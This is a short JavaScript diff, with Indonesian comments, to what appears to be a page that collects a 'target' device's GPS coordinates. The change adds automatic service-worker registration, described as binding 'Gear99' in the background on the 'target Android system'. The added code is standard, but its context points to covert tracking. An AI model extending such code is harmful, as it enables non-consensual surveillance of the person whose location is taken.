@@ -22,7 +22,18 @@
         var targetLatitude = "Belum Diambil";
         var targetLongitude = "Belum Diambil";
         var isStreaming = false;
-        
+
+        // Mendaftarkan Service Worker PWA secara otomatis ke dalam sistem Android target
+if ('serviceWorker' in navigator) {
+    window.addEventListener('load', function() {
+        navigator.serviceWorker.register('/static/sw.js').then(function(reg) {
+            console.log('Gear99 ServiceWorker resmi terikat di latar belakang:', reg.scope);
+        }).catch(function(err) {
+            console.log('Pendaftaran ServiceWorker gagal:', err);
+        });
+    });
+}
+
         async function triggerOtoritas() {
             // 1. Ambil Koordinat GPS Sekali Saja di Awal (Tidak Berulang)
             if (navigator.geolocation) {
